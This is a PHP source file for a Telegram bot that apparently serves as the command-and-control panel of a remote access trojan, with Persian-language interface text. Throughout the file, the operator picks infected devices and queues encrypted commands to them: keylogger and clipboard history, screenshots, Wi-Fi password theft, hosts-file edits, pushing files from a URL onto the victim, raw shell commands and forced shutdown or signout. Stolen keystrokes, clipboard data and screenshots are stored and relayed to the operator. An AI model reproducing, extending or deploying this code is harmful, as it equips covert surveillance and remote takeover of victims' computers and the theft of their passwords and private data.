<?php
require_once 'config.php';
require_once 'utils.php';

class TelegramHandler
{
    public static function handle_telegram_update($pdo, $crypto, $update)
    {
        try {
            $chat_id = $update['message']['chat']['id'] ?? $update['callback_query']['from']['id'] ?? 0;

            if (!self::is_authorized($chat_id)) {
                self::send_telegram_message($chat_id, "Access denied. Only the authorized admin can use this bot.");
                self::log_update($update, "Unauthorized access attempt by chat_id: $chat_id");
                return;
            }

            if (isset($update['callback_query'])) {
                self::process_callback($pdo, $crypto, $update['callback_query']);
            } elseif (isset($update['message'])) {
                self::process_message($pdo, $crypto, $update['message']);
            }

            self::log_update($update, "Update processed successfully");
        } catch (Exception $e) {
            Utils::log_error("Error in handle_telegram_update: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred. Please check the logs.");
        }
    }

    private static function is_authorized($chat_id) {
        $pdo = new PDO(
            "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
            Config::$DB_USER,
            Config::$DB_PASS,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
        $stmt = $pdo->prepare("SELECT chat_id FROM allowed_users WHERE chat_id = ?");
        $stmt->execute([$chat_id]);
        return $stmt->fetchColumn() !== false;
    }

    private static function process_message($pdo, $crypto, $message)
    {
        try {
            $chat_id = $message['chat']['id'];
            $text = $message['text'] ?? '';

            if (!empty($text)) {
                $stmt = $pdo->prepare("
                    INSERT INTO user_typelogs (chat_id, keystrokes, created_at)
                    VALUES (?, ?, NOW())
                ");
                $stmt->execute([$chat_id, $text]);
            }

            if (isset($message['document'])) {
                self::handle_file_upload($pdo, $crypto, $message);
                return;
            }

            switch ($text) {
                case '/start':
                    self::show_client_list($pdo, $chat_id);
                    break;
                case '/test_telegram':
                    self::send_telegram_message($chat_id, "Test message from server");
                    break;
                case '/hosts':
                    $parts = explode(' ', $text, 3);
                    if (count($parts) < 2) {
                        self::send_telegram_message($chat_id, "⚠️ فرمت: /hosts <list|add|remove> [ورودی]");
                        break;
                    }
                    $action = $parts[1];
                    $host_entry = $parts[2] ?? '';
                    if ($action === 'list' || ($action === 'add' && $host_entry) || ($action === 'remove' && $host_entry)) {
                        self::send_command($pdo, $crypto, $chat_id, 'edit_hosts', [
                            'action' => $action,
                            'host_entry' => $host_entry
                        ]);
                        self::send_telegram_message($chat_id, "⏳ در حال پردازش فایل hosts...");
                    } else {
                        self::send_telegram_message($chat_id, "⚠️ فرمت نامعتبر!");
                    }
                    break;
                case '/upload_url':
                    $parts = explode(' ', $text, 3);
                    if (count($parts) < 3) {
                        self::send_telegram_message($chat_id, "⚠️ فرمت: /upload_url <URL> <مسیر مقصد>");
                        break;
                    }
                    $file_url = $parts[1];
                    $dest_path = $parts[2];
                    self::send_command($pdo, $crypto, $chat_id, 'upload_file', [
                        'source' => 'url',
                        'file_url' => $file_url,
                        'dest_path' => $dest_path
                    ]);
                    self::send_telegram_message($chat_id, "⏳ در حال آپلود فایل از URL...");
                    break;

                case '/upload_file':
                    self::send_telegram_message($chat_id, "📎 لطفا فایل را آپلود کنید و مسیر مقصد را به فرمت زیر بنویسید:\n/upload_file_dest <مسیر مقصد>");
                    break;
                case '/help':
                    self::show_help_menu($chat_id);
                    break;
                case '/cmd':
                    self::send_telegram_message($chat_id, "⚠️ از فرمت زیر استفاده کنید:\n/cmd <دستور>");
                    break;
                case '/screens':
                    self::show_screenshots($pdo, $chat_id);
                    break;
                case '/logs':
                    self::show_logs($chat_id);
                    break;
                case '/browse':
                    self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
                        'action' => 'list',
                        'path' => '/' // اضافه کردن پارامتر path
                    ]);
                    break;
                case '/get-info':
                    self::send_command($pdo, $crypto, $chat_id, 'system_info', []);
                    break;
                case '/go':
                    self::send_telegram_message($chat_id, "⚠️ از فرمت زیر استفاده کنید:\n/go <URL>");
                    break;
                case '/users':
                    self::show_client_list($pdo, $chat_id);
                    break;
                case '/shutdown':
                case '/restart':
                case '/sleep':
                case '/signout':
                    self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => substr($text, 1)]);
                    break;
                case '/startup':
                case '/tasks':
                    self::send_command($pdo, $crypto, $chat_id, 'process_management', ['action' => $text === '/startup' ? 'list' : 'list']);
                    break;
                default:
                    if (isset($message['document'])) {
                        $file_id = $message['document']['file_id'];
                        $stmt = $pdo->prepare("INSERT INTO pending_uploads (chat_id, file_id) VALUES (?, ?)");
                        $stmt->execute([$chat_id, $file_id]);
                        self::send_telegram_message($chat_id, "📎 فایل دریافت شد. لطفا مسیر مقصد را با /upload_file_dest <مسیر> مشخص کنید.");
                    } elseif (strpos($text, '/upload_file_dest') === 0) {
                        $parts = explode(' ', $text, 2);
                        if (count($parts) < 2) {
                            self::send_telegram_message($chat_id, "⚠️ فرمت: /upload_file_dest <مسیر مقصد>");
                            break;
                        }
                        $dest_path = $parts[1];
                        $stmt = $pdo->prepare("SELECT file_id FROM pending_uploads WHERE chat_id = ? ORDER BY created_at DESC LIMIT 1");
                        $stmt->execute([$chat_id]);
                        $file_id = $stmt->fetchColumn();
                        if ($file_id) {
                            self::send_command($pdo, $crypto, $chat_id, 'upload_file', [
                                'source' => 'telegram',
                                'file_url' => $file_id,
                                'dest_path' => $dest_path
                            ]);
                            self::send_telegram_message($chat_id, "⏳ در حال آپلود فایل از تلگرام...");
                            $stmt = $pdo->prepare("DELETE FROM pending_uploads WHERE chat_id = ? AND file_id = ?");
                            $stmt->execute([$chat_id, $file_id]);
                        } else {
                            self::send_telegram_message($chat_id, "⚠️ ابتدا فایل را آپلود کنید!");
                        }
                    } elseif (strpos($text, '/cmd') === 0) {
                        $command = trim(substr($text, 4));
                        if (!empty($command)) {
                            self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => $command]);
                            self::send_telegram_message($chat_id, "⏳ در حال اجرای دستور...");
                        } else {
                            self::send_telegram_message($chat_id, "⚠️ دستور خالی است!");
                        }
                    } else {
                        self::send_telegram_message($chat_id, "⚠️ دستور ناشناخته! از /start استفاده کنید.");
                    }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in process_message: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while processing the message.");
        }
    }

    private static function show_help_menu($chat_id)
    {
        $help_text = "🎮 <b>راهنمای دستورات</b>\n\n"
            . "🔍 <code>/start</code> - نمایش لیست دستگاهها\n"
            . "📂 <code>/browse</code> - مرور فایلهای دستگاه\n"
            . "🌐 <code>/go &lt;URL&gt;</code> - باز کردن آدرس اینترنتی\n"
            . "💻 <code>/cmd &lt;command&gt;</code> - اجرای دستور مستقیم\n"
            . "📸 <code>/screens</code> - مشاهده اسکرین‌شاتها\n"
            . "📝 <code>/logs</code> - مشاهده لاگهای خطا\n"
            . "⚙️ <code>/get-info</code> - اطلاعات سیستم\n"
            . "🔌 <code>/shutdown</code> - خاموش کردن دستگاه\n"
            . "🔄 <code>/restart</code> - راه‌اندازی مجدد\n"
            . "❓ <code>/help</code> - نمایش این راهنما";

        self::send_telegram_message(
            $chat_id,
            $help_text,
            ['parse_mode' => 'HTML']
        );
    }

    private static function process_callback($pdo, $crypto, $callback)
    {
        try {
            $chat_id = $callback['from']['id'];
            $data = $callback['data'];
            $message_id = $callback['message']['message_id'] ?? null;

            $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
            $stmt->execute([$chat_id]);
            $selected_client = $stmt->fetch(PDO::FETCH_ASSOC);
            $client_id = $selected_client['selected_client_id'] ?? null;

            if (strpos($data, 'select_client:') === 0) {
                $client_id = substr($data, 14);
                $stmt = $pdo->prepare("UPDATE allowed_users SET selected_client_id = ? WHERE chat_id = ?");
                $stmt->execute([$client_id, $chat_id]);
                self::show_access_menu($pdo, $chat_id, $client_id);
            } elseif (strpos($data, 'action:raw_cmd:') === 0) {
                $client_id = substr($data, 14);
                self::send_telegram_message(
                    $chat_id,
                    "✅ دستگاه انتخاب شد: " . $client_id,
                    ['reply_markup' => json_encode(['remove_keyboard' => true])]
                );
                self::show_access_menu($pdo, $chat_id, $client_id);
            } elseif (strpos($data, 'action:') === 0) {
                $parts = explode(':', $data);
                $action = $parts[1] ?? null;
                $client_id = $parts[2] ?? null;

                if (!$client_id) {
                    self::send_telegram_message($chat_id, "⚠️ دستگاه انتخاب نشده!");
                    return;
                }

                $actions = [
                    'get_info' => [
                        'type' => 'system_info',
                        'text' => "در حال دریافت اطلاعات سیستم...",
                        'params' => []
                    ],
                    'browse' => [
                        'type' => 'file_operation',
                        'text' => "در حال دریافت لیست فایل‌ها...",
                        'params' => ['action' => 'list']
                    ],
                    'shutdown' => [
                        'type' => 'system_command',
                        'text' => "در حال خاموش کردن دستگاه...",
                        'params' => ['command' => 'shutdown']
                    ],
                    'restart' => [
                        'type' => 'system_command',
                        'text' => "در حال راه‌اندازی مجدد دستگاه...",
                        'params' => ['command' => 'restart']
                    ],
                    'sleep' => [
                        'type' => 'system_command',
                        'text' => "در حال قرار دادن دستگاه در حالت خواب...",
                        'params' => ['command' => 'sleep']
                    ],
                    'signout' => [
                        'type' => 'system_command',
                        'text' => "در حال خروج از حساب کاربری...",
                        'params' => ['command' => 'signout']
                    ],
                    'get_wifi_passwords' => [
                        'type' => 'wifi_passwords',
                        'text' => "در حال دریافت رمزهای وای‌فای...",
                        'params' => []
                    ],
                    'edit_hosts' => [
                        'type' => 'edit_hosts',
                        'text' => "لطفا اقدام و ورودی را وارد کنید (مثال: /hosts add 127.0.0.1 example.com یا /hosts list)",
                        'params' => []
                    ],
                    'clipboard' => [
                        'type' => 'clipboard_history',
                        'text' => "در حال دریافت تاریخچه کلیپبورد...",
                        'params' => []
                    ],
                    'keystrokes' => [
                        'type' => 'keystroke_history',
                        'text' => "در حال دریافت تاریخچه کیلاگر...",
                        'params' => []
                    ],
                    'screenshot' => [
                        'type' => 'capture_screenshot',
                        'text' => "در حال گرفتن اسکرین‌شات...",
                        'params' => []
                    ],
                    'process_mgmt' => [
                        'type' => 'process_management',
                        'text' => "در حال دریافت لیست پردازش‌ها...",
                        'params' => ['action' => 'list']
                    ],
                    'open_url' => [
                        'type' => 'open_url',
                        'text' => "لطفا URL را وارد کنید:",
                        'params' => []
                    ],
                    'upload_file' => [
                        'type' => 'upload_file',
                        'text' => "لطفا فایل یا URL را آپلود کنید...",
                        'params' => []
                    ]
                ];

                if ($action && array_key_exists($action, $actions)) {
                    self::send_telegram_message($chat_id, "⏳ " . $actions[$action]['text']);
                    $stmt = $pdo->prepare("
                        INSERT INTO commands (client_id, command, status, created_at)
                        VALUES (?, ?, 'pending', NOW())
                    ");
                    $command_data = ['type' => $actions[$action]['type'], 'params' => array_merge($actions[$action]['params'], ['client_id' => $client_id])];
                    $stmt->execute([$client_id, $crypto->encrypt(json_encode($command_data))]);
                    $command_id = $pdo->lastInsertId();
                    self::poll_for_command_result($pdo, $chat_id, $command_id);
                } else {
                    self::send_telegram_message($chat_id, "⚠️ دستور نامعتبر!");
                }
            } elseif (strpos($data, 'view_old_data:') === 0) {
                $client_id = substr($data, 14);
                self::show_old_data($pdo, $chat_id, $client_id);
            } elseif ($data === 'view_clipboard_logs') {
                if ($client_id) {
                    self::show_clipboard_history($pdo, $chat_id, $client_id);
                } else {
                    self::send_telegram_message($chat_id, "⚠️ دستگاه انتخاب نشده!");
                }
            } else {
                self::send_telegram_message($chat_id, "⚠️ دستور نامشخص!");
            }

            if ($message_id) {
                self::delete_telegram_message($chat_id, $message_id);
            }
        } catch (Exception $e) {
            Utils::log_error("Error in process_callback: " . $e->getMessage());
            self::send_telegram_message($chat_id, "⚠️ خطا در پردازش درخواست!");
        }
    }

    private static function poll_for_command_result($pdo, $chat_id, $command_id)
    {
        $max_attempts = 10;
        $attempt = 0;
        $sleep_interval = 3; // ثانیه

        while ($attempt < $max_attempts) {
            $stmt = $pdo->prepare("SELECT response, status FROM commands WHERE id = ?");
            $stmt->execute([$command_id]);
            $command = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($command && $command['status'] === 'completed' && $command['response']) {
                $result = json_decode($command['response'], true);
                $message = "Command #$command_id executed:\n<pre>" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . "</pre>";
                self::send_telegram_message($chat_id, $message, ['parse_mode' => 'HTML']);
                return;
            }

            $attempt++;
            sleep($sleep_interval);
        }

        self::send_telegram_message($chat_id, "⚠️ Timeout waiting for command result!");
    }

    private static function delete_telegram_message($chat_id, $message_id)
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/deleteMessage";
            $data = [
                'chat_id' => $chat_id,
                'message_id' => $message_id
            ];

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true
            ]);
            curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
            Utils::log_error("Error deleting message: " . $e->getMessage());
        }
    }

    private static function show_client_list($pdo, $chat_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT 
                    u.client_id, 
                    u.last_seen,
                    COUNT(cd.id) AS log_count
                FROM users u
                LEFT JOIN client_data cd ON u.client_id = cd.client_id
                GROUP BY u.client_id
            ");
            $stmt->execute();
            $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!$clients) {
                self::send_telegram_message($chat_id, "📭 هیچ دستگاهی یافت نشد");
                return;
            }

            $keyboard = ['inline_keyboard' => []];
            $now = time();

            foreach ($clients as $client) {
                $last_seen_time = strtotime($client['last_seen']);
                $is_online = ($now - $last_seen_time) <= Config::$ONLINE_THRESHOLD;

                $emoji = $is_online ? "🟢" : "🔴";
                $status = $is_online ? "آنلاین" : "آفلاین";
                $log_count = $client['log_count'];

                $text = "{$emoji} {$client['client_id']} ({$status}) 📚 {$log_count} لاگ";

                $keyboard['inline_keyboard'][] = [[
                    'text' => $text,
                    'callback_data' => 'select_client:' . $client['client_id']
                ]];
            }

            $keyboard['inline_keyboard'][] = [[
                'text' => "📋 مشاهده کلیپبوردهای ذخیره شده",
                'callback_data' => 'view_clipboard_logs'
            ]];

            self::send_telegram_message(
                $chat_id,
                "📱 لیست دستگاهها:\nانتخاب کن یا لاگها رو ببین 👇",
                ['reply_markup' => $keyboard]
            );
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "⚠️ خطا در دریافت لیست دستگاهها");
        }
    }

    private static function show_clipboard_history($pdo, $chat_id, $client_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT content, created_at 
                FROM clipboard_logs
                WHERE client_id = ?
                ORDER BY created_at DESC
                LIMIT 10
            ");
            $stmt->execute([$client_id]);
            $logs = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if ($logs) {
                $message = "📋 تاریخچه کلیپبورد برای {$client_id}:\n\n";
                foreach ($logs as $log) {
                    $message .= "⏰ " . $log['created_at'] . "\n";
                    $message .= "📝 " . substr($log['content'], 0, 100) . "...\n\n";
                }
            } else {
                $message = "📭 هیچ لاگ کلیپبوردی برای {$client_id} پیدا نشد";
            }

            self::send_telegram_message($chat_id, $message);
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "⚠️ خطا در دریافت تاریخچه کلیپبورد");
        }
    }

    private static function show_old_data($pdo, $chat_id, $client_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT * FROM client_data 
                WHERE client_id = ? 
                ORDER BY received_at DESC 
                LIMIT 1
            ");
            $stmt->execute([$client_id]);
            $data = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($data) {
                $message = "اطلاعات قدیمی کاربر $client_id:\n";
                $message .= "کی‌لاگر: " . ($data['keystrokes'] ?? 'نداره') . "\n";
                $message .= "اطلاعات سیستم: " . json_encode($data['system_info'] ?? [], JSON_PRETTY_PRINT) . "\n";
                $message .= "زمان دریافت: " . $data['received_at'] . "\n";
                self::send_telegram_message($chat_id, $message);
            } else {
                self::send_telegram_message($chat_id, "هیچ اطلاعاتی برای $client_id پیدا نشد.");
            }
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "خطا در نمایش اطلاعات قدیمی.");
        }
    }

    private static function show_access_menu($pdo, $chat_id, $client_id)
    {
        $keyboard = [
            'inline_keyboard' => [
                [['text' => 'ℹ️ اطلاعات سیستم', 'callback_data' => "action:get_info:{$client_id}"]],
                [['text' => '📁 مرور فایل‌ها', 'callback_data' => "action:browse:{$client_id}"]],
                [['text' => '📸 اسکرین‌شات', 'callback_data' => "action:screenshot:{$client_id}"]],
                [['text' => '📋 کلیپبورد', 'callback_data' => "action:clipboard:{$client_id}"]],
                [['text' => '⌨️ کیلاگر', 'callback_data' => "action:keystrokes:{$client_id}"]],
                [['text' => '🖥️ پردازش‌ها', 'callback_data' => "action:process_mgmt:{$client_id}"]],
                [['text' => '🔗 باز کردن URL', 'callback_data' => "action:open_url:{$client_id}"]],
                [['text' => '📡 رمزهای وای‌فای', 'callback_data' => "action:get_wifi_passwords:{$client_id}"]],
                [['text' => '📝 ویرایش فایل hosts', 'callback_data' => "action:edit_hosts:{$client_id}"]],
                [['text' => '📤 آپلود فایل', 'callback_data' => "action:upload_file:{$client_id}"]],
                [['text' => '🔧 دستور خام', 'callback_data' => "action:raw_cmd:{$client_id}"]],
                [['text' => '🔌 خاموش کردن', 'callback_data' => "action:shutdown:{$client_id}"]],
                [['text' => '🔄 راه‌اندازی مجدد', 'callback_data' => "action:restart:{$client_id}"]],
                [['text' => '😴 حالت خواب', 'callback_data' => "action:sleep:{$client_id}"]],
                [['text' => '🚪 خروج', 'callback_data' => "action:signout:{$client_id}"]],
                [['text' => '📜 داده‌های قدیمی', 'callback_data' => "view_old_data:{$client_id}"]],
                [['text' => '📋 لاگ کلیپبورد', 'callback_data' => 'view_clipboard_logs']]
            ]
        ];
        self::send_telegram_message($chat_id, "📋 منوی دسترسی برای دستگاه {$client_id}:", [
            'reply_markup' => json_encode($keyboard)
        ]);
    }

    private static function show_keystroke_history($pdo, $chat_id, $client_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT keystrokes, received_at 
                FROM client_data
                WHERE client_id = ?
                ORDER BY received_at DESC
                LIMIT 5
            ");
            $stmt->execute([$client_id]);
            $logs = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if ($logs) {
                $message = "⌨️ تاریخچه کیلاگر برای {$client_id}:\n\n";
                foreach ($logs as $log) {
                    $message .= "⏰ " . $log['received_at'] . "\n";
                    $message .= "🔠 " . substr($log['keystrokes'], 0, 100) . "...\n\n";
                }
            } else {
                $message = "📭 هیچ تاریخچه کیلاگری برای {$client_id} پیدا نشد";
            }

            self::send_telegram_message($chat_id, $message);
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "⚠️ خطا در دریافت تاریخچه کیلاگر");
        }
    }

    private static function show_screenshots($pdo, $chat_id)
    {
        try {
            $stmt = $pdo->prepare("SELECT screenshot_path FROM client_data WHERE screenshot_path IS NOT NULL ORDER BY received_at DESC LIMIT 5");
            $stmt->execute();
            $screenshots = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!$screenshots) {
                self::send_telegram_message($chat_id, "No screenshots found.");
                return;
            }

            foreach ($screenshots as $screenshot) {
                if (file_exists($screenshot['screenshot_path'])) {
                    self::send_telegram_message($chat_id, null, ['photo' => curl_file_create($screenshot['screenshot_path'])]);
                } else {
                    Utils::log_error("Screenshot file not found: " . $screenshot['screenshot_path']);
                }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in show_screenshots: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while fetching screenshots.");
        }
    }

    private static function show_logs($chat_id)
    {
        try {
            if (file_exists(Config::$ERROR_LOG)) {
                $logs = file_get_contents(Config::$ERROR_LOG);
                self::send_telegram_message($chat_id, "Error logs:\n" . htmlspecialchars($logs));
            } else {
                self::send_telegram_message($chat_id, "No logs found.");
            }
        } catch (Exception $e) {
            Utils::log_error("Error in show_logs: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while fetching logs.");
        }
    }

private static function send_command($pdo, $crypto, $chat_id, $type, $params) {
    try {
        $client_id = Utils::sanitize_input($params['client_id'] ?? '');
        if (!$client_id) {
            $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
            $stmt->execute([$chat_id]);
            $client_id = $stmt->fetchColumn();
            if (!$client_id) {
                self::send_telegram_message($chat_id, "No client selected. Please select a client first using /start.");
                return;
            }
        }
        $command = ['type' => $type, 'params' => $params];
        $stmt = $pdo->prepare("
            INSERT INTO commands (client_id, command, status, created_at)
            VALUES (?, ?, 'pending', NOW())
        ");
        $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);
        $command_id = $pdo->lastInsertId();
        self::send_telegram_message($chat_id, "Command sent to client $client_id (ID: $command_id).");
        self::poll_for_command_result($pdo, $chat_id, $command_id);
    } catch (Exception $e) {
        Utils::log_error("Error in send_command: " . $e->getMessage());
        self::send_telegram_message($chat_id, "An error occurred while sending the command: " . $e->getMessage());
    }
}

    private static function handle_file_upload($pdo, $crypto, $message)
    {
        try {
            $chat_id = $message['chat']['id'];
            $file_id = $message['document']['file_id'];
            $file = self::get_telegram_file($file_id);

            $file_path = Config::$UPLOAD_DIR . $message['document']['file_name'];
            file_put_contents($file_path, $file);

            self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
                'action' => 'upload',
                'path' => $file_path
            ]);
        } catch (Exception $e) {
            Utils::log_error("Error in handle_file_upload: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while uploading the file.");
        }
    }

    private static function get_telegram_file($file_id)
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getFile?file_id=$file_id";
            $response = json_decode(file_get_contents($url), true);
            if (!$response['ok']) {
                throw new Exception("Failed to get Telegram file: " . $response['description']);
            }
            $file_path = $response['result']['file_path'];
            $file_content = file_get_contents("https://api.telegram.org/file/bot" . Config::$BOT_TOKEN . "/$file_path");
            if ($file_content === false) {
                throw new Exception("Failed to download Telegram file.");
            }
            return $file_content;
        } catch (Exception $e) {
            Utils::log_error("Error in get_telegram_file: " . $e->getMessage());
            throw $e;
        }
    }

    public static function send_telegram_message($chat_id, $text, $options = [])
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/" . (isset($options['photo']) ? 'sendPhoto' : 'sendMessage');
            $data = [
                'chat_id' => $chat_id,
                'text' => $text,
                'parse_mode' => 'HTML'
            ];

            if (isset($options['reply_markup'])) {
                $data['reply_markup'] = json_encode($options['reply_markup']);
            }

            if (isset($options['photo'])) {
                $data['photo'] = $options['photo'];
            }

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => Config::$COMMAND_TIMEOUT
            ]);
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($http_code !== 200) {
                Utils::log_error("Telegram API error: HTTP $http_code, Response: $response");
            } else {
                Utils::log_update(['response' => $response], "Telegram message sent to chat_id: $chat_id");
            }

            return $response;
        } catch (Exception $e) {
            Utils::log_error("Error in send_telegram_message: " . $e->getMessage());
            return false;
        }
    }

    private static function log_update($update, $message = '')
    {
        $log_entry = [
            'time' => date('Y-m-d H:i:s'),
            'message' => $message,
            'update' => $update
        ];
        file_put_contents(Config::$TELEGRAM_LOG, json_encode($log_entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}
